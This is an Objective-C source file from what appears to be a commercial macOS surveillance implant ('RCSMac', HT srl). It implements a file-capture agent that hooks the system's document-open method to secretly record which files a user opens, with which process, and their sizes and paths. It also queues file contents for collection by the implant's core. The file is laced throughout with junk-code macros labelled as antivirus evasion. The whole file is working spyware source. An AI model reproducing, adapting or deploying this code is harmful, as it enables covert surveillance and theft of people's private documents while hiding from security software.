//
//  RCSMAgentFileCapture.m
//  RCSMac
//
//  Created by revenge on 4/22/11.
//  Copyright 2011 HT srl. All rights reserved.
//

#import "RCSMAgentFileCapture.h"
#import "RCSMInputManager.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

typedef struct _fileConfiguration {
  u_int minFileSize;
  u_int maxFileSize;
  u_int hiMinDate;
  u_int loMinDate;
  u_int reserved1;
  u_int reserved2;
  u_int noFileOpen;
  u_int acceptCount;
  u_int denyCount;
  char patterns[1]; // wchar_t
} fileStruct;

static BOOL gIsFileCaptureActive    = NO;
static BOOL gIsFileOpenActive       = NO;
static NSUInteger gMinSize          = 0;
static NSUInteger gMaxSize          = 0;
static NSDate *gFromDate            = nil;
static NSMutableArray *gIncludeList = nil;
static NSMutableArray *gExcludeList = nil;

BOOL FCStopAgent()
{
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (gIsFileCaptureActive == NO && gIsFileOpenActive == NO)
  {
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    return YES;
  }
  
  gIsFileOpenActive     = NO;
  gIsFileCaptureActive  = NO;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [gFromDate release];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [gIncludeList release];
  [gExcludeList release];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  gIncludeList = nil;
  gExcludeList = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  return YES;
}

BOOL FCStartAgent()
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  BOOL success = YES;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (gIsFileOpenActive == YES || gIsFileCaptureActive == YES)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      return YES;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  //
  // Read configuration
  //
  NSMutableData *readData = [mSharedMemoryLogging readMemoryFromComponent: COMP_AGENT
                                                                 forAgent: AGENT_INTERNAL_FILECAPTURE
                                                          withCommandType: CM_AGENT_CONF];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  if (readData != nil)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      shMemoryLog *shMemLog = (shMemoryLog *)[readData bytes];
      NSMutableData *confData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                              length: shMemLog->commandDataSize];
      
      // AV evasion: only on release build
      AV_GARBAGE_004

      fileStruct *fileConfiguration = (fileStruct *)[confData bytes];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      if (fileConfiguration->noFileOpen == 0) 
        {
          // AV evasion: only on release build
          AV_GARBAGE_008
        
          gIsFileOpenActive = YES;
        }
      else
        {
          // AV evasion: only on release build
          AV_GARBAGE_007
        
          gIsFileOpenActive = NO;
        }

      if (fileConfiguration->minFileSize > 0)
        {
          // AV evasion: only on release build
          AV_GARBAGE_004
        
          gIsFileCaptureActive = YES;
        }
      else
        {
          // AV evasion: only on release build
          AV_GARBAGE_007
        
          gIsFileCaptureActive = NO;
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      int64_t _minDate = ((int64_t)fileConfiguration->hiMinDate << 32) | fileConfiguration->loMinDate;
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      int64_t minDate  = (_minDate - EPOCH_DIFF) / RATE_DIFF;
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      gMinSize  = fileConfiguration->minFileSize;
      gMaxSize  = fileConfiguration->maxFileSize;
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      gFromDate = [[NSDate dateWithTimeIntervalSince1970: minDate] retain];
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      if (gIncludeList == nil)
        gIncludeList = [[NSMutableArray alloc] init];
      if (gExcludeList == nil)
        gExcludeList = [[NSMutableArray alloc] init];
      
      // AV evasion: only on release build
      AV_GARBAGE_003

      int i   = 0;
      off_t z = 0;
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      for (; i < fileConfiguration->acceptCount; i++)
        {
          unichar *_entry = (unichar *)(fileConfiguration->patterns + z);
          
          // AV evasion: only on release build
          AV_GARBAGE_002
         
          int len = _utf16len(_entry);
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          z += len * 2 + sizeof(short); // utf16 + null
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          NSString *entry = [[NSString alloc] initWithCharacters: _entry
                                                          length: len];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          [gIncludeList addObject: entry];
          [entry release];
        }
      
      for (i = 0; i < fileConfiguration->denyCount; i++)
        {
          unichar *_entry = (unichar *)(fileConfiguration->patterns + z);
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          int len = _utf16len(_entry);
          
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          z += len * 2 + sizeof(short); // utf16 + null
          
          // AV evasion: only on release build
          AV_GARBAGE_006
          
          NSString *entry = [[NSString alloc] initWithCharacters: _entry
                                                          length: len];
          
          // AV evasion: only on release build
          AV_GARBAGE_005
          
          [gExcludeList addObject: entry];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          [entry release];
        }

      [confData release];
    }
  else
    {
#ifdef DEBUG_FILE_CAPTURE
      warnLog(@"No configuration found for agent File Capture");
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [outerPool release];
  return success;
}

int compareEntries(const unsigned char *wild, const unsigned char *string)
{
  const unsigned char *cp = NULL, *mp = NULL;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  while ((*string) && (*wild != '*'))
  {
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    if ((toupper((unsigned int)*wild) != toupper((unsigned int)*string))
        && (*wild != '?'))
    {
      return 0;
    }
    wild++;
    string++;
    
    // AV evasion: only on release build
    AV_GARBAGE_001    
  }
  
  while (*string)
  {
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    if (*wild == '*')
    {     
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      if (!*++wild)
      {
        return 1;
      }
      mp = wild;
      cp = string+1;
      
      // AV evasion: only on release build
      AV_GARBAGE_001
    } 
    else if ((toupper((unsigned int)*wild) == toupper((unsigned int)*string))
             || (*wild == '?'))
    {
      wild++;     
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      string++;
    }
    else 
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      wild = mp;
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      string = cp++;
      
      // AV evasion: only on release build
      AV_GARBAGE_002      
    }
  }
  while (*wild == '*')
  {
    wild++;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  return !*wild;
}

BOOL needToLogEntry(NSString *entry)
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  BOOL needToLog = NO;
  
  if (gIncludeList == nil || gExcludeList == nil)
  {        
    // AV evasion: only on release build
    AV_GARBAGE_006    
    
    return needToLog;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSString *procToMatch = nil;
  NSString *filter = entry;
  
#ifdef DEBUG_FILE_CAPTURE
  infoLog(@"Checking       : %@", entry);
#endif
  
  // Check if we have a proc name inside our filter
  if ([entry rangeOfString: @"|"].location != NSNotFound)
  {        
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    procToMatch = [[entry componentsSeparatedByString: @"|"] objectAtIndex: 0];
    
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    filter      = [[entry componentsSeparatedByString: @"|"] objectAtIndex: 1];
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    NSProcessInfo *processInfo  = [NSProcessInfo PROCESSINFO_SEL];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    NSString *currentProc       = [[processInfo processName] copy];
    
    if ([procToMatch isEqualToString: currentProc] == NO)
    {        
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      [currentProc release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      return needToLog;
    }
    else
    {
#ifdef DEBUG_FILE_CAPTURE
      infoLog(@"Process matched (%@)", currentProc);
#endif
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    [currentProc release];
  }
  else
  {
#ifdef DEBUG_FILE_CAPTURE
    warnLog(@"No process configured");
#endif
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  // Check include list
  int i = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  for (; i < [gIncludeList count]; i++)
  {
    NSString *item = [gIncludeList objectAtIndex: i];
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    if (compareEntries((const unsigned char *)[item UTF8String],
                       (const unsigned char *)[filter UTF8String]))
    {        
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      needToLog = YES;
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      break;
    }
  }
  
  // If we didn't find anything inside the include list just return
  if (needToLog == NO)
  {        
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    return needToLog;
  }
  
  // Check the exclude list
  for (i = 0; i < [gExcludeList count]; i++)
  {
    NSString *item = [gExcludeList objectAtIndex: i];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    if (compareEntries((const unsigned char *)[item UTF8String],
                       (const unsigned char *)[filter UTF8String]))
    {        
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      needToLog = NO;
      break;
    }
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  return needToLog;
}

void logFileContent(NSString *filePath)
{
  NSString *tmpPath = filePath;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  char nullTerminator = 0x00;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if ([filePath rangeOfString: @"file://localhost"].location != NSNotFound)
  {        
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    tmpPath = [[filePath componentsSeparatedByString: @"file://localhost"]
               objectAtIndex: 1];
  }
  else
  {
#ifdef DEBUG_FILE_CAPTURE
    warnLog(@"Couldn't normalize path %@", filePath);
#endif
  }
  
  NSMutableData   *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSMutableData *entryData = [[NSMutableData alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  // Filename UTF16 Null-terminated
  [entryData appendData: [tmpPath dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  [entryData appendBytes: &nullTerminator
                  length: sizeof(char)];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [entryData appendBytes: &nullTerminator
                  length: sizeof(char)];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  shMemoryLog *shMemoryHeader     = (shMemoryLog *)[logData bytes];
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->agentID         = AGENT_INTERNAL_FILECAPTURE;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  shMemoryHeader->flag            = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  shMemoryHeader->commandDataSize = [entryData length];
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  if ([mSharedMemoryLogging writeMemory: logData
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
  {
#ifdef DEBUG_FILE_CAPTURE
    verboseLog(@"File path to log sent (%@)", filePath);
#endif
  }
  else
  {
#ifdef DEBUG_FILE_CAPTURE
    errorLog(@"Error while sending file path to log (%@)", filePath);
#endif
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [entryData release];
  [logData release];
}

void logFileOpen(NSString *filePath)
{
  NSMutableData *processName;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  NSMutableData   *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *entryData = [[NSMutableData alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  NSProcessInfo *processInfo  = [NSProcessInfo PROCESSINFO_SEL];
  NSString *_processName      = [[processInfo processName] copy];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  processName  = [[NSMutableData alloc] initWithData:
                  [_processName dataUsingEncoding:
                   NSUTF8StringEncoding]];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  char nullTerminator = 0x00;

  // Struct tm
  time (&rawtime);
  tmTemp = gmtime(&rawtime);
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  tmTemp->tm_year += 1900;
  tmTemp->tm_mon  ++;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if (sizeof(long) == 4) // 32bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
    }
  else if (sizeof(long) == 8) // 64bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x14];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  // Process Name - ASCII null terminated
  [entryData appendData: processName];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  [entryData appendBytes: &nullTerminator
                  length: sizeof(char)];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  // File Size (2 dwords hi-lo)
  NSUInteger filesize;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSString *tmpPath = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if ([filePath rangeOfString: @"file://localhost"].location != NSNotFound)
    {        
      // AV evasion: only on release build
      AV_GARBAGE_008
    
      tmpPath = [[filePath componentsSeparatedByString: @"file://localhost"]
                 objectAtIndex: 1];
    }

  NSDictionary *fileAttributes;
  if (tmpPath != nil)
    {        
      // AV evasion: only on release build
      AV_GARBAGE_006
    
      fileAttributes = [[NSFileManager defaultManager]
        attributesOfItemAtPath: tmpPath
                         error: nil];
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      filesize = [fileAttributes fileSize];
    }
  else
    {        
      // AV evasion: only on release build
      AV_GARBAGE_004
    
      filesize = 0;
    }


  uint32_t hiSize = (int64_t)filesize >> 32;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  uint32_t loSize = filesize & 0xFFFFFFFF;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [entryData appendBytes: &hiSize
                  length: sizeof(hiSize)];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [entryData appendBytes: &loSize
                  length: sizeof(loSize)];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  // Flags (Win masks for read-write)
  uint32_t flags = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  [entryData appendBytes: &flags
                  length: sizeof(flags)];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  // Filename UTF16 Null-terminated
  [entryData appendData: [filePath dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [entryData appendBytes: &nullTerminator
                  length: sizeof(char)];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [entryData appendBytes: &nullTerminator
                  length: sizeof(char)];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  // Delimiter
  uint32_t del = LOG_DELIMITER;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [entryData appendBytes: &del
                  length: sizeof(del)];

  shMemoryLog *shMemoryHeader     = (shMemoryLog *)[logData bytes];
  shMemoryHeader->status          = SHMEM_WRITTEN;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  shMemoryHeader->agentID         = AGENT_INTERNAL_FILEOPEN;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  if ([mSharedMemoryLogging writeMemory: logData
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG_FILE_CAPTURE
      verboseLog(@"File open logged (%@)", filePath);
#endif
    }
  else
    {
#ifdef DEBUG_FILE_CAPTURE
      errorLog(@"Error while logging file open to shared memory (%@)", filePath);
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [_processName release];
  [processName release];
  [entryData release];
  [logData release];
}

@implementation myNSDocumentController : NSObject

- (id)openDocumentWithContentsOfURLHook: (NSURL *)absoluteURL
                                display: (BOOL)displayDocument
                                  error: (NSError **)outError
{        
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  id result = [self openDocumentWithContentsOfURLHook: absoluteURL
                                              display: displayDocument
                                                error: outError];
  BOOL shouldLog = NO;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if (gIsFileOpenActive)
    {        
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      NSString *path = [absoluteURL absoluteString];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      if (needToLogEntry(path))
        {
          shouldLog = YES;
          
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          logFileOpen(path);
        }
      else
        {
#ifdef DEBUG_FILE_CAPTURE
          warnLog(@"File open (%@) didn't match filters");
#endif
        }
    }
  else
    {
#ifdef DEBUG_FILE_CAPTURE
      warnLog(@"File open inactive");
#endif
    }

  if (gIsFileCaptureActive)
    {        
      // AV evasion: only on release build
      AV_GARBAGE_001    

      NSString *path = [absoluteURL absoluteString];
      if (shouldLog || needToLogEntry(path))
        {        
          // AV evasion: only on release build
          AV_GARBAGE_008
        
          logFileContent(path);
        }
      else
        {
#ifdef DEBUG_FILE_CAPTURE
          warnLog(@"File capture (%@) didn't match filters");
#endif
        }
    }
  else
    {
#ifdef DEBUG_FILE_CAPTURE
      warnLog(@"File content inactive");
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  return result;
}

@end
